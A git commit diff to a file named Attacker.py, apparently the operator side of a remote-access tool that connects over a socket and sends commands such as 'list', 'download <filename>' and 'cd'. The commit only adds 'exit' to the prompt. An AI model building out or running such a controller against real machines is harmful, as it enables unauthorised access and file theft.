0ccb69982c5e37bcd1fc312fee1c45616b6d9535
Cypher042 <153519644+Cypher042@users.noreply.github.com>
2024-01-23 12:55:55 +0530

    Update Attacker.py

--- Attacker.py
+++ Attacker.py
@@ -15,7 +15,7 @@ client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 client_socket.connect((HOST, PORT))
 while True:
-    command = input("Enter command ('list' or 'download <filename>' or export or cd): ")
+    command = input("Enter command ('list' or 'download <filename>' or export or cd or exit): ")
 
     client_socket.sendall(command.encode('utf-8'))
 
